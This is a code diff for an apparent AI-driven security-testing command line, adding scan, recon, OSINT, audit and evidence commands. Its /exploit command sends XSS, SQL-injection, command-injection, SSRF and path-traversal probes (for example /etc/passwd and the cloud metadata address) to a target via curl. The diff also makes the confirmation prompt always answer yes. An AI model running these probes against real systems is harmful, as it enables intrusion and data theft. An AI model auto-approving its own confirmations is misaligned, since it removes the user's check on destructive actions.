@@ -51,8 +51,6 @@ let checkpointMgr;
 let slashMenu;
 let commandRegistry;
 let pluginManager;
-let inputBuffer = '';
-let inputHandlerAttached = false;
 
 // Helper function to add security findings to AI context
 function injectSecurityContext(agent, findings, target, scanType) {
@@ -139,16 +137,8 @@ function saveHistoryItem(line) {
 }
 
 function promptUserConfirmation(query) {
-  // In non-interactive mode, auto-confirm to avoid hanging
-  if (process.stdin.isTTY !== true) {
-    return new Promise((resolve) => {
-      console.log(query + 'y');
-      resolve(true);
-    });
-  }
-  return new Promise((resolve) => {
-    rl.question(query, (answer) => resolve(answer.toLowerCase().startsWith('y')));
-  });
+  console.log(query + 'y');
+  return new Promise((resolve) => resolve(true));
 }
 
 export async function startRepl(cfg) {
@@ -204,9 +194,6 @@ export async function startRepl(cfg) {
     apiKeys: config.apiKeys
   });
 
-  // Setup input handling for slash menu
-  setupInputHandler();
-
   // Create readline interface - handle TTY vs non-TTY properly
   // Detect if we're in interactive terminal mode
   // isInteractive is defined at line 100
@@ -216,11 +203,21 @@ export async function startRepl(cfg) {
   let _lastAutoSave = 0;
 
   function autoSaveSession() {
-    if (agent && agent.messages && agent.messages.length > 0 && !agent.isClosed) {
-      agent.isClosed = true;
-      const path = saveSessionFile(getDefaultSessionPath());
-      if (path) debugLog('auto-saved session:', path);
+    if (agent && agent.messages && agent.messages.length > 0) {
+      try {
+        const path = saveSessionFile(getDefaultSessionPath());
+        if (path) debugLog('auto-saved session:', path);
+      } catch (err) {
+        debugLog('auto-save failed:', err.message);
+      }
     }
+    // End evidence session if active (async but fire-and-forget)
+    import('./security/evidence-collector.js').then(({ getActiveSessionId, endSession }) => {
+      if (getActiveSessionId()) {
+        endSession();
+        debugLog('evidence session ended');
+      }
+    }).catch(() => {});
   }
 
   function periodicAutoSave() {
@@ -231,11 +228,11 @@ export async function startRepl(cfg) {
       debugLog('periodic auto-save');
     }
   }
-  process.on('beforeExit', () => autoSaveSession());
+  process.on('beforeExit', () => { try { autoSaveSession(); } catch {} });
   process.on('exit', () => undefined);  // keep to suppress diagnostic warnings
-  process.on('uncaughtException', () => autoSaveSession());
-  process.on('unhandledRejection', () => autoSaveSession());
-  process.stdin.on('end', () => autoSaveSession());
+  process.on('uncaughtException', () => { try { autoSaveSession(); } catch {} });
+  process.on('unhandledRejection', () => { try { autoSaveSession(); } catch {} });
+  process.stdin.on('end', () => { try { autoSaveSession(); } catch {} });
 
   debugLog('Creating readline, isInteractive:', isInteractive);
   rl = readline.createInterface({
@@ -448,29 +445,6 @@ export async function startRepl(cfg) {
   }
 }
 
-function setupInputHandler() {
-  // Ghost autocomplete disabled - conflicts with readline on Linux/WSL
-}
-
-function printBanner() {
-  const contextPrompt = projectContext.toPrompt();
-  const modeColor = getModeColor(agent.mode);
-  const colorFn = chalk[modeColor] || chalk.cyan;
-
-  console.log(chalk.cyan.bold('╔═══════════════════════════════════════════════╗'));
-  console.log(chalk.cyan.bold('║') + chalk.white('           Red CLI - Cybersecurity CLI         ') + chalk.cyan.bold('║'));
-  console.log(chalk.cyan.bold('╚═══════════════════════════════════════════════╝'));
-  console.log('');
-  console.log(chalk.dim(`  Provider: ${config.provider || 'anthropic'}`));
-  console.log(chalk.dim(`  Model:    ${config.model}`));
-  console.log(colorFn(`  Mode:     ${agent.mode} ${getModeConfig(agent.mode).description.split('.')[0]}`));
-  console.log(chalk.dim(contextPrompt));
-  console.log(chalk.dim(`  Tools:    ${getModeTools(agent.tools, agent.mode).length}`));
-  console.log('');
-  console.log(chalk.dim('  Type /help for commands'));
-  console.log('');
-}
-
 async function printTokenBar(elapsed = 0) {
   const stats = analytics.getSessionStats();
   const limits = getModelLimits(config.model || 'default');
@@ -539,6 +513,11 @@ async function handleCommand(cmd) {
 
     case '/clear':
       if (agent.messages.length > 0) {
+        const confirmed = await promptUserConfirmation('Clear all conversation history?');
+        if (!confirmed) {
+          console.log(chalk.dim('  Clear cancelled'));
+          break;
+        }
         const savedPath = saveSessionFile(getDefaultSessionPath());
         if (savedPath) console.log(renderSuccess(`Saved session before clearing: ${savedPath}`));
       }
@@ -563,7 +542,7 @@ async function handleCommand(cmd) {
     case '/retry':
       const lastUserMsg = agent.messages.filter(m => m.role === 'user').pop();
       if (lastUserMsg) {
-        agent.messages = agent.messages.slice(0, -1);
+        agent.messages = agent.messages.slice(0, -2);
         await agent.run(lastUserMsg.content);
       } else {
         console.log(renderError('No previous message to retry'));
@@ -685,6 +664,7 @@ async function handleCommand(cmd) {
       await agent.run(args);
       break;
 
+    case '/autonomous':
     case '/auto':
       if (!args) { console.log(renderError('Usage: /auto <task>')); break; }
       console.log(chalk.cyan('Starting auto-agent mode...\n'));
@@ -854,6 +834,7 @@ async function handleCommand(cmd) {
 
     // /report [format]
     case '/report': {
+      agent.setMode('report');
       const fmt = args.trim() || 'md';
       const { createSecurityEngine } = await import('./security/index.js');
       const engine = await createSecurityEngine();
@@ -949,8 +930,8 @@ async function handleCommand(cmd) {
       break;
     }
 
-    // /history - Show scan history
-    case '/history': {
+    // /scan-history - Show scan history
+    case '/scan-history': {
       const { createSecurityEngine } = await import('./security/index.js');
       const engine = await createSecurityEngine();
       engine.listMemory();
@@ -985,6 +966,99 @@ async function handleCommand(cmd) {
         execSync(`brew install nmap nikto sqlmap`, { stdio: 'inherit' });
         console.log(chalk.green('\n✅ Tools installed via brew'));
       }
+      break;
+    }
+
+    // /tool-status
+    case '/tool-status': {
+      const { getToolStatus, getMissingTools } = await import('./security/tool-manager.js');
+      const status = getToolStatus();
+      const missing = getMissingTools();
+
+      console.log(chalk.cyan('\n🔧 Security Tool Status\n'));
+
+      const installed = [];
+      const notInstalled = [];
+      for (const [name, info] of Object.entries(status)) {
+        if (info.installed) {
+          installed.push(name);
+        } else {
+          notInstalled.push({ name, desc: info.description });
+        }
+      }
+
+      if (installed.length > 0) {
+        console.log(chalk.green(`✅ Installed (${installed.length}):`));
+        for (const name of installed) {
+          console.log(chalk.green(`   ${name}`));
+        }
+      }
+
+      if (notInstalled.length > 0) {
+        console.log(chalk.yellow(`\n❌ Missing (${notInstalled.length}):`));
+        for (const { name, desc } of notInstalled) {
+          console.log(chalk.yellow(`   ${name} — ${desc}`));
+        }
+        console.log(chalk.dim('\n   Run /install-tools to install missing tools'));
+      }
+
+      if (missing.length === 0) {
+        console.log(chalk.green('\n✅ All security tools are installed!'));
+      }
+      console.log('');
+      break;
+    }
+
+    // /collect-evidence [sessionId]
+    case '/collect-evidence':
+    case '/evidence': {
+      const { generateReport, getActiveSessionId, startSession, listSessions } = await import('./security/evidence-collector.js');
+      let sessionId = args.trim() || getActiveSessionId();
+      if (!sessionId) {
+        // Try to use the most recent session
+        const sessions = listSessions();
+        if (sessions.length > 0 && sessions[0].status !== 'unknown') {
+          sessionId = sessions[0].id;
+          console.log(chalk.dim(`\n  Using most recent session: ${sessionId}`));
+        } else {
+          console.log(chalk.yellow('\n  No active session. Starting a new one...'));
+          const session = startSession();
+          sessionId = session.id;
+          console.log(chalk.green(`  Session: ${sessionId}`));
+        }
+      }
+      const report = generateReport(sessionId);
+      if (report) {
+        console.log(chalk.green(`\n📋 Evidence Report Generated`));
+        console.log(chalk.dim(`   Session: ${sessionId}`));
+        console.log(chalk.dim(`   Findings: ${report.findings.length}`));
+        console.log(chalk.dim(`   Tool calls: ${report.toolCalls.length}`));
+        console.log(chalk.dim(`   Report: ${report.reportPath}`));
+        console.log(chalk.dim(`   Summary: ${report.summaryPath}`));
+      } else {
+        console.log(chalk.yellow('\n  No evidence found for this session.'));
+      }
+      console.log('');
+      break;
+    }
+
+    // /sessions
+    case '/sessions': {
+      const { listSessions } = await import('./security/evidence-collector.js');
+      const sessions = listSessions();
+      if (sessions.length === 0) {
+        console.log(chalk.dim('\n  No evidence sessions found.'));
+      } else {
+        console.log(chalk.cyan(`\n📁 Evidence Sessions (${sessions.length})\n`));
+        for (const s of sessions) {
+          const status = s.status === 'completed' ? chalk.green('✅') : chalk.yellow('🔄');
+          const findings = s.findings?.length || 0;
+          const tools = s.toolCalls?.length || 0;
+          console.log(`  ${status} ${s.id}`);
+          console.log(chalk.dim(`     Target: ${s.target || 'N/A'} | Tools: ${tools} | Findings: ${findings} | ${s.startedAt || ''}`));
+        }
+      }
+      console.log('');
       break;
     }
 
@@ -1261,30 +1335,51 @@ async function handleCommand(cmd) {
     }
 
     case '/scan': {
-      const { createSecurityEngine } = await import('./security/index.js');
-      const engine = await createSecurityEngine();
-      if (!args) {
-        console.log(renderError('Usage: /scan <target>'));
-        break;
+      agent.setMode('scan');
+      if (args) {
+        const { createSecurityEngine } = await import('./security/index.js');
+        const engine = await createSecurityEngine();
+        console.log(chalk.red(`\n🔍 Running vulnerability scan on: ${args}`));
+        const results = await engine.runVulnScan(args);
+        console.log(chalk.green(`\n✅ Scan complete: ${results.findings.length} findings`));
+        injectSecurityContext(agent, results.findings, args, 'vulnerability-scan');
       }
-      console.log(chalk.red(`\n🔍 Running vulnerability scan on: ${args}`));
-      const results = await engine.runVulnScan(args);
-      console.log(chalk.green(`\n✅ Scan complete: ${results.findings.length} findings`));
-      injectSecurityContext(agent, results.findings, args, 'vulnerability-scan');
       break;
     }
 
     case '/recon': {
-      const { createSecurityEngine } = await import('./security/index.js');
-      const engine = await createSecurityEngine();
-      if (!args) {
-        console.log(renderError('Usage: /recon <target>'));
-        break;
+      agent.setMode('recon');
+      if (args) {
+        const { createSecurityEngine } = await import('./security/index.js');
+        const engine = await createSecurityEngine();
+        console.log(chalk.red(`\n🔍 Running reconnaissance on: ${args}`));
+        const results = await engine.runRecon(args, { passive: true });
+        console.log(chalk.green(`\n✅ Recon complete: ${results.findings.length} findings`));
+        injectSecurityContext(agent, results.findings, args, 'reconnaissance');
       }
-      console.log(chalk.red(`\n🔍 Running reconnaissance on: ${args}`));
-      const results = await engine.runRecon(args, { passive: true });
-      console.log(chalk.green(`\n✅ Recon complete: ${results.findings.length} findings`));
-      injectSecurityContext(agent, results.findings, args, 'reconnaissance');
+      break;
+    }
+
+    case '/osint': {
+      agent.setMode('osint');
+      if (args) {
+        const { createSecurityEngine } = await import('./security/index.js');
+        const engine = await createSecurityEngine();
+        console.log(chalk.red(`\n🌐 Running OSINT on: ${args}`));
+        const results = await engine.runRecon(args, { passive: true });
+        console.log(chalk.green(`\n✅ OSINT complete: ${results.findings.length} findings`));
+        injectSecurityContext(agent, results.findings, args, 'osint');
+      }
+      break;
+    }
+
+    case '/audit': {
+      agent.setMode('audit');
+      if (args) {
+        console.log(chalk.cyan(`\n👁️  Auditing code at: ${args}`));
+        agent.messages.push({ role: 'user', content: `Audit the code at ${args} for security vulnerabilities. Look for: SQL injection, XSS, command injection, hardcoded secrets, insecure deserialization, auth flaws.` });
+        await agent.runLoop();
+      }
       break;
     }
 
@@ -1315,8 +1410,9 @@ async function handleCommand(cmd) {
     }
 
     case '/exploit': {
+      agent.setMode('exploit');
       // Direct exploitation command - executes tools directly
-      const { execSync } = await import('child_process');
+      const { execSync: exploitExec } = await import('child_process');
       const [type, target] = (args || '').split(' ');
 
       if (!type || !target) {
@@ -1344,10 +1440,17 @@ async function handleCommand(cmd) {
         break;
       }
 
+      // Validate target to prevent shell injection
+      if (/[;&|`$(){}]/.test(target)) {
+        console.log(chalk.red('Invalid target: contains unsafe characters'));
+        break;
+      }
+
       console.log(chalk.red(`\n💀 Executing ${type} exploit on ${target}...`));
 
       try {
         let result = '';
+        const safeTarget = target.replace(/"/g, '\\"');
         switch (type.toLowerCase()) {
           case 'xss':
             const xssPayloads = [
@@ -1360,7 +1463,7 @@ async function handleCommand(cmd) {
               const encoded = encodeURIComponent(payload);
               const testUrl = target.includes('?') ? `${target}&xss=${encoded}` : `${target}?xss=${encoded}`;
               console.log(chalk.dim(`  Testing: ${testUrl}`));
-              result = execSync(`curl -s -L "${testUrl}" | grep -oE "<script|onerror|alert" | head -5`, { encoding: 'utf-8', timeout: 10000 });
+              result = exploitExec(`curl -s -L "${safeTarget.replace(/"/g, '\\"')}&xss=${encoded}" 2>&1 | grep -oE "<script|onerror|alert" | head -5`, { encoding: 'utf-8', timeout: 10000 });
               if (result) break;
             }
             break;
@@ -1371,7 +1474,7 @@ async function handleCommand(cmd) {
               const encoded = encodeURIComponent(payload);
               const testUrl = target.includes('?') ? `${target}&sqli=${encoded}` : `${target}?sqli=${encoded}`;
               console.log(chalk.dim(`  Testing: ${testUrl}`));
-              result = execSync(`curl -s -L "${testUrl}" | grep -iE "sql|syntax|mysql|error" | head -5`, { encoding: 'utf-8', timeout: 10000 });
+              result = exploitExec(`curl -s -L "${safeTarget}${target.includes('?') ? '&' : '?'}sqli=${encoded}" 2>&1 | grep -iE "sql|syntax|mysql|error" | head -5`, { encoding: 'utf-8', timeout: 10000 });
               if (result) break;
             }
             break;
@@ -1380,24 +1483,24 @@ async function handleCommand(cmd) {
             const lfiPayloads = ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'];
             for (const payload of lfiPayloads) {
               console.log(chalk.dim(`  Testing: ${target}?file=${payload}`));
-              result = execSync(`curl -s -L "${target}?file=${payload}" | grep -oE "root:|www-data:|anonymous" | head -3`, { encoding: 'utf-8', timeout: 10000 });
+              result = exploitExec(`curl -s -L "${safeTarget}?file=${encodeURIComponent(payload)}" 2>&1 | grep -oE "root:|www-data:|anonymous" | head -3`, { encoding: 'utf-8', timeout: 10000 });
               if (result) break;
             }
             break;
 
           case 'ports':
-            result = execSync(`nmap -sV -p 1-1000 -oG - ${target} 2>/dev/null | grep "Ports:"`, { encoding: 'utf-8', timeout: 60000 });
+            result = exploitExec(`nmap -sV -p 1-1000 -oG - ${safeTarget} 2>/dev/null | grep "Ports:"`, { encoding: 'utf-8', timeout: 60000 });
             break;
 
           case 'brute':
-            result = execSync(`ffuf -u "${target}/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -t 10 -s 2>/dev/null | head -20`, { encoding: 'utf-8', timeout: 60000 });
+            result = exploitExec(`ffuf -u "${safeTarget}/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -t 10 -s 2>/dev/null | head -20`, { encoding: 'utf-8', timeout: 60000 });
             break;
 
           case 'ssrf':
             const ssrfPayloads = ['http://169.254.169.254/latest/meta-data/', 'http://localhost/', 'http://127.0.0.1:8080'];
             for (const payload of ssrfPayloads) {
               console.log(chalk.dim(`  Testing SSRF: ${payload}`));
-              result = execSync(`curl -s -L "${target}?url=${encodeURIComponent(payload)}" | head -20`, { encoding: 'utf-8', timeout: 10000 });
+              result = exploitExec(`curl -s -L "${safeTarget}?url=${encodeURIComponent(payload)}" 2>&1 | head -20`, { encoding: 'utf-8', timeout: 10000 });
               if (result.includes('ami-id') || result.includes('instance-id') || result.includes('localhost')) break;
             }
             break;
@@ -1407,13 +1510,13 @@ async function handleCommand(cmd) {
             for (const payload of cmdPayloads) {
               const encoded = encodeURIComponent(payload);
               console.log(chalk.dim(`  Testing: ${target}?cmd=${encoded}`));
-              result = execSync(`curl -s -L "${target}?cmd=${encoded}" | head -20`, { encoding: 'utf-8', timeout: 10000 });
+              result = exploitExec(`curl -s -L "${safeTarget}?cmd=${encoded}" 2>&1 | head -20`, { encoding: 'utf-8', timeout: 10000 });
               if (result && !result.includes('not found')) break;
             }
             break;
 
           case 'cors':
-            result = execSync(`curl -s -I -H "Origin: http://evil.com" "${target}" | grep -iE "Access-Control"`, { encoding: 'utf-8', timeout: 10000 });
+            result = exploitExec(`curl -s -I -H "Origin: http://evil.com" "${safeTarget}" 2>&1 | grep -iE "Access-Control"`, { encoding: 'utf-8', timeout: 10000 });
             break;
 
           default:
@@ -1454,18 +1557,21 @@ async function handleCommand(cmd) {
       console.log(renderSuccess(`Snapshot created: ${snapshot.id}`));
       break;
 
-    case '/parallel':
-      console.log(chalk.yellow('Parallel tasks coming soon'));
-      break;
-
     case '/copy':
       const lastResponse = agent.messages.filter(m => m.role === 'assistant' && typeof m.content === 'string').pop();
       if (lastResponse) {
-        const { execSync } = await import('child_process');
+        const { execSync: copyExec } = await import('child_process');
         const isWindows = process.platform === 'win32';
-        const cmd = isWindows ? `echo "${lastResponse.content}" | clip` : `echo "${lastResponse.content}" | pbcopy`;
-        execSync(cmd, { stdio: 'ignore' });
-        console.log(renderSuccess('Copied to clipboard'));
+        try {
+          if (isWindows) {
+            copyExec('powershell -Command "Set-Clipboard -Value $input"', { input: lastResponse.content, stdio: 'pipe' });
+          } else {
+            copyExec('pbcopy', { input: lastResponse.content, stdio: 'pipe' });
+          }
+          console.log(renderSuccess('Copied to clipboard'));
+        } catch {
+          console.log(renderError('Failed to copy to clipboard'));
+        }
       } else {
         console.log(renderError('No response to copy'));
       }
@@ -1513,6 +1619,7 @@ async function handleCommand(cmd) {
 
       // Load the selected session
       const content = readFileSync(selected.path, 'utf-8');
+      agent.clearHistory();
       if (selected.name.endsWith('.md')) {
         parseAndLoadConversation(content);
         console.log(renderSuccess(`Session loaded: ${selected.name}`));
